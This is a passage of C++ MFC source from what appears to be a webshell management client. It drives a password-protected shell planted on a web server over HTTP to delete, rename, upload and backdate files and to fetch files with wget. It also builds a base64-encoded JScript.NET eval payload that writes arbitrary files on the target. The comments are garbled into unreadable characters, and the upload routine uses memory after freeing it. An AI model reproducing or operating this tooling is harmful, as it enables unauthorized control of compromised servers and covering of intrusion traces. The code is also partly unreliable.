		bOnFileRename = true;					//ʧȥ����,�ж�Ҫ��Ҫ

		CRect rect,dlgRect;
		/*
		��õ�ǰ�еĿ������Ӧ����û��������
		�˴����û�õ�����rect���ο������ÿ��
		�����һ��ʱ���صĿ�������еĿ�ȣ���Ҳ��֪��Ϊɶ
		*/
		int width = m_filelist.GetColumnWidth(0);
		m_filelist.GetSubItemRect(nSelectList, 0, LVIR_BOUNDS,rect);

		//���listctrl���ο�
		//��ø��Ի����λ���Ե���CEdit����ʾλ�ã�������������
		m_filelist.GetWindowRect(&dlgRect);
		//�����븸���ڶ�Ӧ
		ScreenToClient(&dlgRect);
		int height = rect.Height();
		rect.top += (dlgRect.top+2);
		rect.left += (dlgRect.left+20);
		rect.bottom = rect.top+height+2;
		rect.right = rect.left+width-20;
		m_SubItemEdit.MoveWindow(&rect);
		m_SubItemEdit.BringWindowToTop();
		m_SubItemEdit.SetWindowText( m_filelist.GetItemText(nSelectList, 0) );
		m_SubItemEdit.SetSel(0,-1);
		m_SubItemEdit.ShowWindow(SW_SHOW);
		m_SubItemEdit.SetFocus();
	}
	return;
}
void CFileDlg::OnFileChangeTime()								//����ʱ��
{
	if(nSelectList != -1)
	{
		bOnFileChangeTime = true;					//ʧȥ����,�ж�Ҫ��Ҫ
		CRect rect,dlgRect;
		/*
		��õ�ǰ�еĿ������Ӧ����û��������
		�˴����û�õ�����rect���ο������ÿ��
		�����һ��ʱ���صĿ�������еĿ�ȣ���Ҳ��֪��Ϊɶ
		*/
		int width = m_filelist.GetColumnWidth(1);
		m_filelist.GetSubItemRect(nSelectList, 1, LVIR_BOUNDS,rect);

		//���listctrl���ο�
		//��ø��Ի����λ���Ե���CEdit����ʾλ�ã�������������
		m_filelist.GetWindowRect(&dlgRect);
		//�����븸���ڶ�Ӧ
		ScreenToClient(&dlgRect);
		int height = rect.Height();
		rect.top += (dlgRect.top+2);
		rect.left += (dlgRect.left+7);
		rect.bottom = rect.top+height+2;
		rect.right = rect.left+width-7;
		m_SubItemEdit.MoveWindow(&rect);
		m_SubItemEdit.BringWindowToTop();
		m_SubItemEdit.SetWindowText( m_filelist.GetItemText(nSelectList, 1) );
		m_SubItemEdit.SetSel(0,-1);
		m_SubItemEdit.ShowWindow(SW_SHOW);
		m_SubItemEdit.SetFocus();
	}
	return;
}
void CFileDlg::OnFileNewDirectory()								//�½�Ŀ¼
{
	bOnFileNewDirectory = true;					//ʧȥ����,�ж�Ҫ��Ҫ

	int m_i = m_filelist.GetItemCount();
	m_filelist.InsertItem(m_i, "New Folder",0);
	m_filelist.EnsureVisible(m_i, FALSE);

	CString szOnFileNewDirectory;
	CTime tm = CTime::GetCurrentTime();
	szOnFileNewDirectory = tm.Format("%Y-%m-%d %X");

	m_filelist.SetItemText(m_i, 1, szOnFileNewDirectory);
	m_filelist.SetItemText(m_i, 2, "0");
	m_filelist.SetItemText(m_i, 3, "32");

	CRect rect,dlgRect;
	/*
	��õ�ǰ�еĿ������Ӧ����û��������
	�˴����û�õ�����rect���ο������ÿ��
	�����һ��ʱ���صĿ�������еĿ�ȣ���Ҳ��֪��Ϊɶ
	*/
	int width = m_filelist.GetColumnWidth(0);
	m_filelist.GetSubItemRect(m_i, 0, LVIR_BOUNDS,rect);
	
	//���listctrl���ο�
	//��ø��Ի����λ���Ե���CEdit����ʾλ�ã�������������
	m_filelist.GetWindowRect(&dlgRect);
	//�����븸���ڶ�Ӧ
	ScreenToClient(&dlgRect);
	int height = rect.Height();
	rect.top += (dlgRect.top+2);
	rect.left += (dlgRect.left+20);
	rect.bottom = rect.top+height+2;
	rect.right = rect.left+width-20;
	m_SubItemEdit.MoveWindow(&rect);
	m_SubItemEdit.BringWindowToTop();
	m_SubItemEdit.SetWindowText( m_filelist.GetItemText(m_i, 0) );
	m_SubItemEdit.SetSel(0,-1);
	m_SubItemEdit.ShowWindow(SW_SHOW);
	m_SubItemEdit.SetFocus();
}

int CALLBACK listCompare(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort)
{
	DATA* pListCtrl = (DATA*)lParamSort;
	int col = pListCtrl->subitem;//���������ݸ�col�������жϵ���˵ڼ���
	if (col == 2)					//int�ͱȽ�
	{
		//�õ����е�ǰ2��
		CString strItem1 = (pListCtrl->plist)->GetItemText((int)lParam1, col);
		CString strItem2 = (pListCtrl->plist)->GetItemText((int)lParam2, col);
		//�Ƚ�������
		LPCTSTR s1=(LPCTSTR)strItem1;
		LPCTSTR s2=(LPCTSTR)strItem2;
		//���ַ���תΪint�ͱȽ�
		int n1=atoi((_bstr_t)s1);
		int n2=atoi((_bstr_t)s2);
		if(fav)//fav�������ж��������ǽ������еĺ���
		{
			//�Ƚ������� �������-1��ʾn1����n2ǰ�棬�������1��ʾn1����n2���棬�����ȷ���0������û���ж���ȵ����
			if (n1<n2)
				return -1;
			else
				return 1;
		}else{
			if (n1<n2)
				return 1;
			else
				return -1;
		}
	}else{		//�ַ����Ƚϣ�����ͬ�����Ƶ��ַ����ᱻ�ŷŵ�һ��
		CString strItem1 =  (pListCtrl->plist)->GetItemText((int)lParam1, col);
		CString strItem2 =  (pListCtrl->plist)->GetItemText((int)lParam2, col);
		
		if (fav)
		{
			return _tcsicmp(strItem1.GetBuffer(MAX_PATH),strItem2.GetBuffer(MAX_PATH));
		}else{
			return _tcsicmp(strItem2.GetBuffer(MAX_PATH),strItem1.GetBuffer(MAX_PATH));
		}
	}
	return 0;
}

void CFileDlg::OnLvnColumnclickList1(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	
	for(int i = 0; i < m_filelist.GetItemCount(); ++i) //���for���������е��������������
	{
		m_filelist.SetItemData(i,i);
	}
	
	DATA data;
	data.subitem = pNMLV->iSubItem;
	data.plist = &m_filelist;
	fav = !fav;
	m_filelist.SortItems(listCompare,(LPARAM)&data);
	
	*pResult = 0;
}

BOOL CFileDlg::PreTranslateMessage(MSG* pMsg)
{
	if(pMsg -> message == WM_KEYDOWN)
	{
		if(pMsg -> wParam == VK_BACK)		//�˸񣬷�����һ��
		{
			if ( (GetFocus()->GetParent()) != GetDlgItem(IDC_COMBO_FILEPATH) && GetDlgItem(IDC_EDIT_FILE_SUBITEM) != GetFocus() )
			{
				OnBnClickedUpperstory();
				return TRUE;
			}
		}

		if(pMsg -> wParam == VK_F5)			//���� F5��ˢ��
		{
			OnFileRefresh();				//ˢ��
			return TRUE;
		}

		if ( GetDlgItem(IDC_FILE_LIST) == GetFocus() )//�������ļ��б����
		{
			if(pMsg -> wParam == VK_F2)	//���� F2��������
			{
				nSelectList = m_filelist.GetNextItem(-1,LVNI_SELECTED);
				OnFileRename();		//������
				return TRUE;
			}
			if(pMsg -> wParam == VK_DELETE)//���� DELETE����ѡ��ɾ���ļ�
			{
				OnFileDeleteFiles();					//��ѡ��ɾ���ļ�
				return TRUE;
			}
			if ((pMsg->wParam == 'C' || pMsg->wParam == 'c') && ::GetKeyState(VK_CONTROL)&0x8000)
			{
				OnFileCopy();															//�ļ�����
				return TRUE;
			}

			if ((pMsg->wParam == 'X' || pMsg->wParam == 'x') && ::GetKeyState(VK_CONTROL)&0x8000)
			{
				OnFileCut();															//�ļ�����
				return TRUE;
			}
			if ((pMsg->wParam == 'V' || pMsg->wParam == 'v') && ::GetKeyState(VK_CONTROL)&0x8000)
			{
				OnFilePaste();															//�ļ�ճ��
				return TRUE;
			}
		}


		if ( GetDlgItem(IDC_EDIT_FILE_SUBITEM) != GetFocus() )
		{
			if(pMsg -> wParam == VK_ESCAPE)
				return TRUE;
			if(pMsg -> wParam == VK_RETURN)
			{
				if ( (GetFocus()->GetParent()) == GetDlgItem(IDC_COMBO_FILEPATH) )			//�س���ȡEDIT���ݵ�Ŀ¼�ļ�
				{
					OnBnClickedReadfiles();
					return TRUE;
				}else if ( GetDlgItem(IDC_FILE_LIST) == GetFocus() )	//�س������б��
				{
					//////////////////////////////////////////////////////////////////////////
					CString temp;
					int nList = m_filelist.GetNextItem(-1,LVNI_SELECTED);
					if (nList < 0)
					{
						m_filelist.SetFocus();
						return TRUE;//������ȡ�б�����ݵ�С���⡣
					}

					if (!bThreadFinish)
					{
						m_edit.SetWindowText( "GetFiles Threads busy" );					//����״̬��
						m_filelist.SetFocus();
						return TRUE;
					}

					GetDlgItemText(IDC_COMBO_FILEPATH, temp);

					LV_ITEM lvitem = {0};
					lvitem.iItem = nList;
					lvitem.iSubItem = 0;
					lvitem.mask = LVIF_TEXT|LVIF_IMAGE|LVIF_PARAM;				//����ͼ���ж��ļ�����
					m_filelist.GetItem(&lvitem);

					if (lvitem.iImage== 0)				// ���ļ���
					{
						if (IsWin)
						{
							GetFiles_szPath = temp + m_filelist.GetItemText(nList,0) + "\\";
							GetFiles_bNoDB = false;//Ĭ�� false
							bThreadFinish = false;
							CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);

							//GetFiles(temp + m_filelist.GetItemText(nList,0) + "\\");
						}else{
							GetFiles_szPath = temp + m_filelist.GetItemText(nList,0) + "/";
							GetFiles_bNoDB = false;//Ĭ�� false
							bThreadFinish = false;
							CreateThread(NULL, 0, GetFiles, (LPVOID)this, 0, 0);

							//GetFiles(temp + m_filelist.GetItemText(nList,0) + "/");
						}
					}else{																		// ���ļ����༭�ļ�
						CString szCommonFileType = ".jpg.gif.png.bmp.jpeg.ico.zip.rar.tgz.7z.tar.gz.iso.cab.bz2.jar.dmg.exe.msi.dll.sys.avi.mpeg.mpg.vob.rmvb.wmv.mp3.mp4.3gp.ogg.voc"
							".swf.pdf.flv.fla.psd.doc.docx.xls.xlsx.ppt.pptx.mdb.rtf.";
						CString szFilesTypeName = m_filelist.GetItemText(nList,0);
						szFilesTypeName = szFilesTypeName.Right( rfind(szFilesTypeName, ".") );

						if (szFilesTypeName == "" || szCommonFileType.Find(szFilesTypeName + ".") == -1)
						{
							//AfxMessageBox("�ļ��༭: "+ temp+ m_filelist.GetItemText(nList,0));
							CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
							szGlobal_SiteUrl = szSiteUrl;
							szGlobal_SitePass = szSitePass;
							nGlobal_SiteScript = nSiteScript;
							nGlobal_SiteCode = nSiteCode;
							szGlobal_SiteFileSave = temp + m_filelist.GetItemText(nList,0);
							pMainHatchet->AddFileSaveTab();

							return CDialog::PreTranslateMessage(pMsg);
						}else{
							//	���� ����
							OnFileDownloadFile();											//�����ļ�
						}
					}
					m_filelist.SetFocus();

					return TRUE;
					//////////////////////////////////////////////////////////////////////////
				}else{
					return TRUE;
				}
			}
		}else{
			if(pMsg -> wParam == VK_ESCAPE)		//ȡ��
			{
				bOnFileRename = false;
				bOnFileChangeTime = false;
				if (bOnFileNewDirectory)
				{
					int m_i = m_filelist.GetItemCount();
					m_filelist.DeleteItem(m_i-1);		//ESC �Ͳ�Ҫ��
				}
				bOnFileNewDirectory = false;

				m_SubItemEdit.ShowWindow(SW_HIDE);
				m_filelist.SetFocus();
				return TRUE;
			}
			if(pMsg -> wParam == VK_RETURN)		//ȷ��
			{
				m_SubItemEdit.ShowWindow(SW_HIDE);
				m_filelist.SetFocus();
				return TRUE;
			}
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CFileDlg::OnFileDeleteFiles()										//��ѡ��ɾ���ļ�
{
	CString temp;
	POSITION pos = m_filelist.GetFirstSelectedItemPosition();
	CStringArray	szDeleteFilesArr;
	CString			szDFTemp;
	szDeleteFilesArr.RemoveAll();
	if (!pos)
	{
		return;
	}
	while (pos)
	{
		szDFTemp.Format("%d", m_filelist.GetNextSelectedItem(pos));
		//AfxMessageBox( szDeleteFiles );
		szDeleteFilesArr.Add(szDFTemp);
		
		//szDeleteFilesArr.Add( m_filelist.GetNextSelectedItem(pos) );
	}
	CString szOnFileDeleteFiles = "\t";
	
	for (int j=0; j < szDeleteFilesArr.GetSize(); j++)
	{
		szOnFileDeleteFiles += m_filelist.GetItemText( atoi(szDeleteFilesArr.GetAt(j)), 0) + "\r\n\t";
	}
	
	if ( MessageBox( szOnFileDeleteFiles.Left(szOnFileDeleteFiles.GetLength()-3), "Whether to delete these files ?", MB_OKCANCEL) != IDOK)			//ѯ��ɾ��
	{
		m_filelist.SetFocus();
		return;
	}
	
	//////////////////////////////////////////////////////////////////////////
	GetDlgItemText(IDC_COMBO_FILEPATH, szOnFileDeleteFiles);
	szOnFileDeleteFiles.Replace("\\", "\\\\");
	
	CString szDFSendCode = "";
	if (nSiteScript == 1)								//	ASP
	{
		szDFSendCode = szSitePass + szFileDelete[0];
	}
	else if (nSiteScript == 2)							//  ASPX
	{
		szDFTemp.Format("%d", nSiteCode);
		szDFSendCode = szSitePass + szFileDelete[1];
		szDFSendCode.Replace("%nPageCode%", szDFTemp);
	}
	else if(nSiteScript == 3)							//  PHP
	{
		szDFSendCode = szSitePass + szFileDelete[2];
	}
	else if (nSiteScript == 4)							//  JSP
	{
		szDFSendCode = szSitePass +"=E&z0="+ szSiteCode +"&z1=";
	}else{
		return;
	}
	
	for (int i=(int)szDeleteFilesArr.GetCount(); i > 0; i--)
	{
		m_edit.SetWindowText( "DeleteFile: "+ m_filelist.GetItemText( atoi(szDeleteFilesArr.GetAt(i-1)), 0));					//����״̬��
		bHttpIsOK = MyHttp(szSiteUrl, szDFSendCode + UrlEnCode(nSiteCode, szOnFileDeleteFiles + m_filelist.GetItemText( atoi(szDeleteFilesArr.GetAt(i-1)), 0)), nSiteCode, temp, szError);
		if (bHttpIsOK && temp == "1")
		{
			m_edit.SetWindowText( "DeleteFiles: "+ m_filelist.GetItemText( atoi(szDeleteFilesArr.GetAt(i-1)), 0) +" completed");					//����״̬��
			m_filelist.DeleteItem( atoi(szDeleteFilesArr.GetAt(i-1)) );
		}else{
			m_edit.SetWindowText( "DeleteFiles: "+ m_filelist.GetItemText( atoi(szDeleteFilesArr.GetAt(i-1)), 0) +" fail");					//����״̬��
		}
	}
	m_filelist.SetFocus();
	return;
}

void CFileDlg::OnKillFocusSubItemEdit()									//ʧȥ����
{
	CString temp;
	CString szKillFocusFileTemp, temp1;
	GetDlgItemText(IDC_COMBO_FILEPATH, szKillFocusFileTemp);
	szKillFocusFileTemp.Replace("\\", "\\\\");

	m_SubItemEdit.ShowWindow(SW_HIDE);
	CString szOnKillFocusSubItemEdit;
	GetDlgItemText(IDC_EDIT_FILE_SUBITEM, szOnKillFocusSubItemEdit);

	CString szOldFilePath = "";


	if (bOnFileRename)																	//������
	{
		if (m_filelist.GetItemText(nSelectList, 0) == szOnKillFocusSubItemEdit)//��ԭ��һ��������Ҫ�����ݿ����
		{
			bOnFileRename = false;
			bOnFileChangeTime = false;
			bOnFileNewDirectory = false;
			return;
		}
		//////////////////////////////////////////////////////////////////////////
		bool bFileExist = false;	//�ļ��Ƿ����
		for(int i = 0; i < m_filelist.GetItemCount(); ++i)
		{
			if (IsWin)
			{
				if (_stricmp(szOnKillFocusSubItemEdit, m_filelist.GetItemText(i, 0)) == 0)
				{
					bFileExist = true;
					break;
				}
			}else{
				if (strcmp(szOnKillFocusSubItemEdit, m_filelist.GetItemText(i, 0)) == 0)
				{
					bFileExist = true;
					break;
				}
			}
		}
		if ( bFileExist )
		{
			m_edit.SetWindowText( "This file already exists.");					//����״̬��
			bOnFileRename = false;
			bOnFileChangeTime = false;
			bOnFileNewDirectory = false;
			return;
		}
		//////////////////////////////////////////////////////////////////////////
		szOldFilePath = UrlEnCode(nSiteCode,  szKillFocusFileTemp + m_filelist.GetItemText(nSelectList, 0) );			//�ɵ�
		CString szNewFilePath = UrlEnCode(nSiteCode,  szKillFocusFileTemp + szOnKillFocusSubItemEdit );				//�µ�

		if (nSiteScript == 1)								//	ASP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileReName[0] + szOldFilePath +"&z2="+ szNewFilePath , nSiteCode, temp, szError);
		}
		else if (nSiteScript == 2)							//  ASPX
		{
			szKillFocusFileTemp.Format("%d", nSiteCode);
			temp1 = szFileReName[1];
			temp1.Replace("%nPageCode%", szKillFocusFileTemp);
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + temp1 + szOldFilePath +"&z2="+ szNewFilePath , nSiteCode, temp, szError);
		}
		else if(nSiteScript == 3)							//  PHP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileReName[2] + szOldFilePath +"&z2="+ szNewFilePath , nSiteCode, temp, szError);
		}
		else if (nSiteScript == 4)							//  JSP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass +"=I&z0="+ szSiteCode +"&z1="+ szOldFilePath +"&z2="+ szNewFilePath, nSiteCode, temp, szError);
		}
		if (bHttpIsOK && temp == "1")
		{
			m_edit.SetWindowText( "Rename completed");					//����״̬��
			m_filelist.SetItemText(nSelectList, 0, szOnKillFocusSubItemEdit);
		}else{
			m_edit.SetWindowText( "Rename fail,"+ temp);					//����״̬��
		}
	}
	if (bOnFileChangeTime)																//����ʱ��
	{
		if (m_filelist.GetItemText(nSelectList, 1) == szOnKillFocusSubItemEdit)//��ԭ��һ��������Ҫ�����ݿ����
		{
			bOnFileRename = false;
			bOnFileChangeTime = false;
			bOnFileNewDirectory = false;
			return;
		}
		szOldFilePath = UrlEnCode(nSiteCode,  szKillFocusFileTemp + m_filelist.GetItemText(nSelectList, 0) );			//Ҫ�޸�ʱ����ļ���
		CString szFileNewTime = UrlEnCode(nSiteCode, szOnKillFocusSubItemEdit);										//�޸�ʱ��
		if (nSiteScript == 2)							//  ASPX ��Ҫ�޸ı���
		{
			szKillFocusFileTemp.Format("%d", nSiteCode);
			temp1 = szFileChangeTime[1];
			temp1.Replace("%nPageCode%", szKillFocusFileTemp);
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + temp1 + szOldFilePath +"&z2="+ szFileNewTime , nSiteCode, temp, szError);
		}else if(nSiteScript == 4)						// JSP
		{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass +"=K&z0="+ szSiteCode +"&z1="+ szOldFilePath +"&z2="+ szFileNewTime, nSiteCode, temp, szError);
		}else{
			bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileChangeTime[nSiteScript-1] + szOldFilePath +"&z2="+ szFileNewTime , nSiteCode, temp, szError);
		}
		if (bHttpIsOK && temp == "1")		//���سɹ�
		{
			m_edit.SetWindowText( "ChangeTime completed");					//����״̬��
			m_filelist.SetItemText(nSelectList, 1, szOnKillFocusSubItemEdit);
		}else{
			m_edit.SetWindowText( "ChangeTime fail,"+ temp);					//����״̬��
		}
	}
	if (bOnFileNewDirectory)
	{
		int m_i = m_filelist.GetItemCount();
		//////////////////////////////////////////////////////////////////////////
		bool bFileExist = false;	//�ļ��Ƿ����
		for(int i = 0; i < m_filelist.GetItemCount(); ++i)
		{
			if (IsWin)
			{
				if (_stricmp(szOnKillFocusSubItemEdit, m_filelist.GetItemText(i, 0)) == 0)
				{
					bFileExist = true;
					break;
				}
			}else{
				if (strcmp(szOnKillFocusSubItemEdit, m_filelist.GetItemText(i, 0)) == 0)
				{
					bFileExist = true;
					break;
				}
			}
		}
		if ( bFileExist )
		{
			m_edit.SetWindowText( "This file already exists.");					//����״̬��
			m_filelist.DeleteItem(m_i-1);										//�½����ɹ�,ɾ����¼
			bOnFileRename = false;
			bOnFileChangeTime = false;
			bOnFileNewDirectory = false;
			return;
		}
		//////////////////////////////////////////////////////////////////////////
		if (szOnKillFocusSubItemEdit != "" && szOnKillFocusSubItemEdit != "New Folder")	//�½�Ŀ¼
		{
			m_filelist.SetItemText(m_i-1, 0, szOnKillFocusSubItemEdit);
			CString szKillFocusFileNewDir = UrlEnCode(nSiteCode, szKillFocusFileTemp + szOnKillFocusSubItemEdit);	//�½����ļ�������
			if (nSiteScript == 2)					//ASPX
			{
				szKillFocusFileTemp.Format("%d", nSiteCode);
				temp1 = szFileNewDir[1];
				temp1.Replace("%nPageCode%", szKillFocusFileTemp);
				bHttpIsOK = MyHttp(szSiteUrl, szSitePass + temp1 + szKillFocusFileNewDir , nSiteCode, temp, szError);
			}
			else if(nSiteScript == 4)				//JSP
			{
				bHttpIsOK = MyHttp(szSiteUrl, szSitePass +"=J&z0="+ szSiteCode +"&z1="+ szKillFocusFileNewDir, nSiteCode, temp, szError);
			}else{
				bHttpIsOK = MyHttp(szSiteUrl, szSitePass + szFileNewDir[nSiteScript-1] + szKillFocusFileNewDir , nSiteCode, temp, szError);
			}
			if (bHttpIsOK && temp == "1")
			{
				m_edit.SetWindowText( "Create a new directory to complete");					//����״̬��
			}else{											//�½�ʧ��
				m_filelist.DeleteItem(m_i-1);
				m_edit.SetWindowText( "Create a new directory failed");					//����״̬��
			}
		}else{																			//�½����ɹ�,ɾ����¼
			m_filelist.DeleteItem(m_i-1);
		}
	}

	bOnFileRename = false;
	bOnFileChangeTime = false;
	bOnFileNewDirectory = false;
}


void CFileDlg::OnFileWget()													//Wget
{
	CWgetDlg * pWget = new CWgetDlg;
	if (pWget)
	{
		szGlobal_SiteUrl = szSiteUrl;
		szGlobal_SitePass = szSitePass;
		nGlobal_SiteScript = nSiteScript;
		nGlobal_SiteCode = nSiteCode;

		CString szOnFileWget;
		GetDlgItemText(IDC_COMBO_FILEPATH, szOnFileWget);
		CPoint pt;
		GetCursorPos(&pt);
		pWget->szWgetPath = szOnFileWget;
		pWget->Create(CWgetDlg::IDD,this);
		pWget->ShowWindow(SW_SHOW);
		pWget->SetWindowPos(NULL, pt.x-100, pt.y-50, 0, 0, SWP_NOZORDER | SWP_NOSIZE);
	}
}

DWORD WINAPI FunUploadFile(LPVOID lpParameter)						//�ϴ��ļ�
{
	FunFileInfo* pInfo = (FunFileInfo*)lpParameter;

	CString szSiteUrl_pInfo = pInfo->szSiteUrl;
	CString szSitePass_pInfo = pInfo->szSitePass;
	int nSiteCode_pInfo = pInfo->nSiteCode;
	int nSiteScript_pInfo = pInfo->nSiteScript;
	CString szSavePath_pInfo = pInfo->szS1;
	CString szLocalPath_pInfo = pInfo->szS2;

	m_edit.SetWindowText( "Uploading: "+ szLocalPath_pInfo );					//����״̬��

	CString temp;
	WIN32_FIND_DATA fd;
	HANDLE hFind = ::FindFirstFile(szLocalPath_pInfo,&fd);
	//������ͬ�����ļ����ļ���
	if (hFind == INVALID_HANDLE_VALUE)
	{
		return false;
	}
	else if (fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)//�ж��Ƿ�ΪĿ¼
	{
		m_edit.SetWindowText( "This is the folder, Software is improving!" );					//����״̬��
		return 0;
	}
	else//�ж�Ϊ�ļ�
	{
	}
	::FindClose(hFind);

	CString szUrlEnFile = UrlEnFile(szLocalPath_pInfo);
	CString UPTemp;
	if (nSiteScript_pInfo == 1)								//	ASP
	{
		szSavePath_pInfo = UrlEnCode(nSiteCode_pInfo, szSavePath_pInfo, false, true);
		for (int sizei=0; sizei<=szUrlEnFile.GetLength(); sizei+=51200)
		{
			CString szUrlEnFile_Send = szUrlEnFile.Mid(sizei, 51200);
			if (sizei == 0)
			{
				bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szFileUpload[0] + szSavePath_pInfo +"&z2="+ szUrlEnFile_Send +"&z3=0", nSiteCode_pInfo, temp, szError);
			}else{
				bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szFileUpload[0] + szSavePath_pInfo +"&z2="+ szUrlEnFile_Send +"&z3=1", nSiteCode_pInfo, temp, szError);
			}
		}
		//&z3=0"//z3 = 1��׷���ı�
	}
	else if (nSiteScript_pInfo == 2)							//  ASPX
	{
		UPTemp.Format("%d", nSiteCode_pInfo);
		szSavePath_pInfo = MyBase64Encode(nSiteCode_pInfo, szSavePath_pInfo);
		szSavePath_pInfo = szFileUpload[1] + szSavePath_pInfo;
		szSavePath_pInfo.Replace("%nPageCode%", UPTemp);		//�滻��ߵı���

		CString szBase64EvalCode = "var P:String=System.Text.Encoding.GetEncoding("+ UPTemp +").GetString(System.Convert.FromBase64String(Request.Item[\"z1\"]));"
			"var Z:String=Request.Item[\"z2\"];var B:byte[]=new byte[Z.Length/2];for(var i=0;i<Z.Length;i+=2){B[i/2]=byte(Convert.ToInt32(Z.Substring(i,2),16));}"
			"if(Int32.Parse(Request.Item[\"z3\"])>0)"
			"{var fs:System.IO.FileStream=new System.IO.FileStream(P,System.IO.FileMode.Append);fs.Seek(0,System.IO.SeekOrigin.End);fs.Write(B,0,B.Length);fs.Close();"
			"}else{var fs2:System.IO.FileStream=new System.IO.FileStream(P,System.IO.FileMode.Create);fs2.Write(B,0,B.Length);fs2.Close();}"
			"Response.Write(\"1\");";
		szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
		szSavePath_pInfo.Replace("%szBase64EvalCode%", szBase64EvalCode);

		for (int sizei=0; sizei<=szUrlEnFile.GetLength(); sizei+=51200)
		{
			CString szUrlEnFile_Send = szUrlEnFile.Mid(sizei, 51200);
			if (sizei == 0)
			{
				bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szSavePath_pInfo + "&z2="+ szUrlEnFile_Send +"&z3=0", nSiteCode_pInfo, temp, szError);
			}else{
				bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szSavePath_pInfo + "&z2="+ szUrlEnFile_Send +"&z3=1", nSiteCode_pInfo, temp, szError);
			}
		}
	}
	else if(nSiteScript_pInfo == 3)							//  PHP
	{
		szSavePath_pInfo = MyBase64Encode(nSiteCode_pInfo, szSavePath_pInfo);
		for (int sizei=0; sizei<=szUrlEnFile.GetLength(); sizei+=51200)
		{
			CString szUrlEnFile_Send = szUrlEnFile.Mid(sizei, 51200);
			if (sizei == 0)
			{
				bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szFileUpload[2] + szSavePath_pInfo +"&z2="+ szUrlEnFile_Send +"&z3=w", nSiteCode_pInfo, temp, szError);
			}else{
				bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + szFileUpload[2] + szSavePath_pInfo +"&z2="+ szUrlEnFile_Send +"&z3=a", nSiteCode_pInfo, temp, szError);
			}
		}
	}
	else if (nSiteScript_pInfo == 4)							//  JSP
	{
		CString szSiteCode = "";
		if (nSiteCode_pInfo == 65001)
		{
			szSiteCode = "UTF-8";
		}
		else if (nSiteCode_pInfo == 936)
		{
			szSiteCode = "GB2312";
		}
		else if (nSiteCode_pInfo == 950)
		{
			szSiteCode = "BIG5";
		}

		szSavePath_pInfo = UrlEnCode(nSiteCode_pInfo, szSavePath_pInfo);
		bHttpIsOK = MyHttp(szSiteUrl_pInfo, szSitePass_pInfo + "=G&z0="+ szSiteCode +"&z1="+ szSavePath_pInfo +"&z2="+ szUrlEnFile, nSiteCode_pInfo, temp, szError);
	}
	if (bHttpIsOK && temp == "1")//�ϴ��ɹ�
	{
		delete pInfo;
		m_edit.SetWindowText( "Upload complete: "+ szLocalPath_pInfo );					//����״̬��
		pInfo->pHwnd->OnFileRefresh();													//ˢ��
		return 1;
	}

	delete pInfo;
	m_edit.SetWindowText( "Upload Failed: "+ szLocalPath_pInfo );					//����״̬��
	return 0;
}

void CFileDlg::OnFileUploadFile()														//�Ҽ����ϴ��ļ�
{
	CFileDialog dlg(TRUE, NULL, NULL, OFN_ALLOWMULTISELECT, _T("All files(*.*)|*.*||"));
	DWORD MAXFILE = 2000 * 256;
	dlg.m_ofn.nMaxFile = MAXFILE;
	char* pMaxFile = new char[MAXFILE];
	dlg.m_ofn.lpstrFile = pMaxFile;
	dlg.m_ofn.lpstrFile[0] = NULL;
	dlg.m_ofn.lpstrTitle = _T("Select one or more files uploaded to the server");//�Ի������
	
	if(dlg.DoModal() == IDOK)
	{
		CString szOnDropFilePath,	//�ļ�ȫ·����
			szOnDropFile;			//�ļ���
		bool bFileExist = false;	//�ļ��Ƿ����

		int nCount = 0;
		POSITION pos = dlg.GetStartPosition();
		while (pos != NULL)
		{
			bFileExist = false;
			szOnDropFilePath = dlg.GetNextPathName(pos);
			szOnDropFile = szOnDropFilePath.Right( rfind(szOnDropFilePath, "\\")-1 ); //ȡ���ļ���

			for(int i = 0; i < m_filelist.GetItemCount(); ++i)
			{
				if (IsWin)
				{
					if (_stricmp(szOnDropFile, m_filelist.GetItemText(i, 0)) == 0)
					{
						bFileExist = true;
						break;
					}
				}else{
					if (strcmp(szOnDropFile, m_filelist.GetItemText(i, 0)) == 0)
					{
						bFileExist = true;
						break;
					}
				}
			}
			CString szEditPath;
			GetDlgItemText(IDC_COMBO_FILEPATH, szEditPath);
			//szEditPath.Replace("\\","\\\\");		//ȡ��Զ�̵�·��	2015.01.20 IPC BUG
			szEditPath = szEditPath + szOnDropFile;		//·�������ļ���

			FunFileInfo *pInfo;
			pInfo = new FunFileInfo;
			pInfo->szSiteUrl = szSiteUrl;
			pInfo->szSitePass = szSitePass;
			pInfo->nSiteCode = nSiteCode;
			pInfo->nSiteScript = nSiteScript;
			pInfo->szS1 = szEditPath;
			pInfo->szS2 = szOnDropFilePath;
			pInfo->pHwnd = this;
			Sleep(100);

			if (!bFileExist)
			{
				//bUpOK = FunUploadFile(szEditPath, szOnDropFilePath);
				CreateThread(NULL, 0, FunUploadFile, pInfo, 0, 0);
			}else{
				if (MessageBox(szOnDropFile + " This file already exists. Replace existing file? ", "", MB_OKCANCEL) == IDOK)
				{
					//bUpOK = FunUploadFile(szEditPath, szOnDropFilePath);
					CreateThread(NULL, 0, FunUploadFile, pInfo, 0, 0);
				}else{
					delete pInfo;
				}
			}
			nCount++;
		}
		//OnBnClickedReadfiles();	//�ϴ���ɣ�ˢ���б�
	}
	delete[] pMaxFile;
}

DWORD WINAPI FunDownloadFile(LPVOID lpParameter)											//�����ļ�
{
